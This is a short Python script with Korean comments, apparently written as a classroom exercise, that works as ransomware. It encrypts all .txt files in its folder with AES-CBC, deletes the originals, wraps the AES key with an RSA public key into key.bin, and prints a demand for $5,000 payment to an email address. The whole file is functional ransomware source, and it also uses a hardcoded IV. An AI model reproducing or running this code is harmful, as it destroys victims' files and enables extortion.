import os
import glob
from Crypto.Cipher import AES
from base64 import b64encode
from Crypto.Util.Padding import pad
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import PKCS1_OAEP

iv = b'\xce\x8f\xe0\xc2{\xd4N\x00\x1e\xf5\xaa\x80\xc2\xd0>\xd6' #iv 고정

if __name__=='__main__':

    #1) AES_CBC 암호화를 위한 128bits 대칭키를 랜덤하게 생성함, AES 객체 생성
    aes_key=get_random_bytes(16) #key는 bytes형태
    #2) 폴더 내의 txt 파일 불러오기
    files=glob.glob("./*.txt") #glob는 경로까지 포함해서 리스트로 저장

    #3) AES로 파일 암호화
    for file in files:

    #ct=평문->utf인코딩->b64인코딩->utf디코딩
        cipher = AES.new(aes_key, AES.MODE_CBC, iv=iv) #얘를 반복문 안에 넣어줘야한다...
        input_file=open(file,'rt')
        output_file=open(file[2:-4]+'.enc','wt')
        # input_file의 이름에서 경로와 확장자를 지운 후 .enc를 추가하여 output_file의 이름을 만듦
        pt = input_file.read()
        ct = cipher.encrypt(pad(pt.encode('utf-8'),AES.block_size)) #평문을 인코딩하여 바이트형태로 바꿔준후 encrypt
        # 그냥 바이트 형태는 \x10\x2c\x22 뭐 이런 꼴.. 텍스트로 저장하기 위하여 아스키 코드로 바꾸어주자(b64encode)
        # b64encode해도 아직 바이트이긴 하므로 utf-8로 디코딩하여 string으로 바꿔서 저장하자.
        ct = b64encode(ct).decode('utf-8') #최종은 string으로 저장
        output_file.write(ct)

        input_file.close()
        output_file.close()
        os.remove(file)

    #6) 위에서 생성된 symmetric key를 암호화하여 key.bin에 저장
    pub_key = RSA.import_key(open("public.pem").read()) #0x1f249..이런 형식
    file_out = open("key.bin", 'wb')
    cipher_rsa = PKCS1_OAEP.new(pub_key)
    enc_key = cipher_rsa.encrypt(aes_key)
    file_out.write(enc_key) #바이트 형태를 받아 바이트 형태로 씀
    file_out.close()

    # 7) 협박 메시지 출력
    print("""Your text files are encrypted. 
To decrypt them, you need to pay me $5,000 and send key.bin in your folder to haeun506@ewhain.net""")
